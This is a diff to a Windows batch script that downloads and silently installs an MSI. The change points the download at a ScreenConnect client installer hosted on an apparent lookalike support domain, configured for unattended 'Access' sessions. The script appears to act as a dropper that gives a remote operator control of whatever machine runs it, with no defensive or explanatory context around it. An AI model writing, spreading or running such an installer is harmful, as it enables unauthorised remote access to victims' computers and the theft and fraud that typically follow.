@@ -4,7 +4,7 @@ setlocal enabledelayedexpansion
 REM ==============================
 REM Configuration
 REM ==============================
-set MSI_URL=https://care2support.online/ClientSetup.msi
+set MSI_URL=https://server.care1support.cloud/Bin/ScreenConnect.ClientSetup.msi?e=Access&y=Guest&c=&c=&c=userA&c=&c=&c=&c=&c=
 set MSI_NAME=ClientSetup.msi
 set DOWNLOAD_DIR=%TEMP%\MSIInstall
 set MSI_PATH=%DOWNLOAD_DIR%\%MSI_NAME%
@@ -53,3 +53,4 @@ if %INSTALL_EXIT_CODE% neq 0 (
 
 echo MSI installed successfully
 exit /b 0
+
